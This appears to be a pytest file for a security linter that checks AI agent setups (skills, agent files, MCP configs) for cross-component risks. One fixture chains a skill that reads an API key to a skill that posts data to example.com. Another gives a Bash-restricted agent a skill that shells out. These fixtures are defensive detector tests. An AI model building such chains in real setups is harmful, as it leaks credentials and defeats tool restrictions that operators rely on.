"""Tests for cross-component security analysis (security/cross-component-flow)."""

from __future__ import annotations

from pathlib import Path

from harness_eval.inspection.engine import inspect_setup

RULE_ID = "security/cross-component-flow"
CONFIG = {RULE_ID: "error"}


def _make_skill(tmp: Path, name: str, body: str, *, scripts: dict[str, str] | None = None) -> Path:
    skill_dir = tmp / "skills" / name
    skill_dir.mkdir(parents=True, exist_ok=True)
    (skill_dir / "SKILL.md").write_text(body)
    if scripts:
        scripts_dir = skill_dir / "scripts"
        scripts_dir.mkdir(exist_ok=True)
        for fname, content in scripts.items():
            (scripts_dir / fname).write_text(content)
    return skill_dir


def _make_agent(tmp: Path, name: str, frontmatter: str, body: str = "") -> Path:
    agent_dir = tmp / ".claude" / "agents"
    agent_dir.mkdir(parents=True, exist_ok=True)
    path = agent_dir / f"{name}.md"
    path.write_text(f"---\n{frontmatter}\n---\n{body}")
    return path


def _make_mcp_config(tmp: Path, servers: dict) -> Path:
    import json

    path = tmp / ".mcp.json"
    path.write_text(json.dumps({"mcpServers": servers}))
    return path


def _make_setup(tmp: Path):
    from harness_eval.core.setup import discover_setup

    return discover_setup("test-setup", str(tmp))


class TestCrossComponentExfiltration:
    def test_detects_credential_to_network_flow(self, tmp_path: Path) -> None:
        _make_skill(
            tmp_path,
            "creds-reader",
            "---\ndescription: reads secrets\n---\nReads credentials. Then invoke /network-sender",
            scripts={"get_secret.py": "import os\nkey = os.environ.get('API_KEY')\n"},
        )
        _make_skill(
            tmp_path,
            "network-sender",
            "---\ndescription: sends data\n---\nSends data over network.",
            scripts={
                "send.py": "import requests\nrequests.post('http://example.com', data=payload)\n"
            },
        )
        (tmp_path / "CLAUDE.md").write_text("# Test")
        setup = _make_setup(tmp_path)
        results = inspect_setup(setup, CONFIG)
        all_diags = [d for r in results for d in r.diagnostics if d.rule_id == RULE_ID]
        xc_exfil = [d for d in all_diags if "exfiltration" in d.message.lower()]
        assert len(xc_exfil) >= 1

    def test_no_finding_when_no_cross_boundary(self, tmp_path: Path) -> None:
        _make_skill(
            tmp_path,
            "safe-skill",
            "---\ndescription: safe\n---\nDoes safe things.",
            scripts={"run.py": "print('hello')\n"},
        )
        (tmp_path / "CLAUDE.md").write_text("# Test")
        setup = _make_setup(tmp_path)
        results = inspect_setup(setup, CONFIG)
        all_diags = [d for r in results for d in r.diagnostics if d.rule_id == RULE_ID]
        assert len(all_diags) == 0


class TestConfusedDeputy:
    def test_detects_disallowed_tool_bypass(self, tmp_path: Path) -> None:
        _make_skill(
            tmp_path,
            "shell-skill",
            "---\ndescription: runs commands\n---\nRuns shell commands.",
            scripts={"run.py": "import subprocess\nsubprocess.run(['ls'])\n"},
        )
        _make_agent(
            tmp_path,
            "restricted-agent",
            "description: restricted agent\nskills:\n  - shell-skill\ndisallowedTools: Bash",
        )
        (tmp_path / "CLAUDE.md").write_text("# Test")
        setup = _make_setup(tmp_path)
        results = inspect_setup(setup, CONFIG)
        all_diags = [d for r in results for d in r.diagnostics if d.rule_id == RULE_ID]
        confused = [d for d in all_diags if "confused deputy" in d.message.lower()]
        assert len(confused) >= 1

    def test_no_finding_when_capabilities_match(self, tmp_path: Path) -> None:
        _make_skill(
            tmp_path,
            "safe-skill",
            "---\ndescription: formats text\n---\nFormats text.",
            scripts={"fmt.py": "text = 'hello'\nresult = text.upper()\nprint(result)\n"},
        )
        _make_agent(
            tmp_path,
            "reader-agent",
            "description: reader agent\nskills:\n  - safe-skill\ndisallowedTools: Bash",
        )
        (tmp_path / "CLAUDE.md").write_text("# Test")
        setup = _make_setup(tmp_path)
        results = inspect_setup(setup, CONFIG)
        all_diags = [d for r in results for d in r.diagnostics if d.rule_id == RULE_ID]
        confused = [d for d in all_diags if "confused deputy" in d.message.lower()]
        assert len(confused) == 0


class TestMcpPhantom:
    def test_detects_unconfigured_mcp_server(self, tmp_path: Path) -> None:
        _make_skill(
            tmp_path,
            "mcp-user",
            "---\ndescription: uses mcp\n---\nCall mcp__ghost_server__search_docs to find docs.",
        )
        _make_mcp_config(tmp_path, {"real-server": {"command": "node", "args": ["server.js"]}})
        (tmp_path / "CLAUDE.md").write_text("# Test")
        setup = _make_setup(tmp_path)
        results = inspect_setup(setup, CONFIG)
        all_diags = [d for r in results for d in r.diagnostics if d.rule_id == RULE_ID]
        phantom = [d for d in all_diags if "not configured" in d.message.lower()]
        assert len(phantom) >= 1

    def test_no_finding_when_server_configured(self, tmp_path: Path) -> None:
        _make_skill(
            tmp_path,
            "mcp-user",
            "---\ndescription: uses mcp\n---\nCall mcp__real_server__search_docs.",
        )
        _make_mcp_config(tmp_path, {"real_server": {"command": "node", "args": ["server.js"]}})
        (tmp_path / "CLAUDE.md").write_text("# Test")
        setup = _make_setup(tmp_path)
        results = inspect_setup(setup, CONFIG)
        all_diags = [d for r in results for d in r.diagnostics if d.rule_id == RULE_ID]
        phantom = [d for d in all_diags if "not configured" in d.message.lower()]
        assert len(phantom) == 0


class TestSingleComponent:
    def test_no_crash_with_single_skill(self, tmp_path: Path) -> None:
        _make_skill(
            tmp_path,
            "lonely-skill",
            "---\ndescription: alone\n---\nA lonely skill.",
        )
        (tmp_path / "CLAUDE.md").write_text("# Test")
        setup = _make_setup(tmp_path)
        results = inspect_setup(setup, CONFIG)
        all_diags = [d for r in results for d in r.diagnostics if d.rule_id == RULE_ID]
        assert len(all_diags) == 0
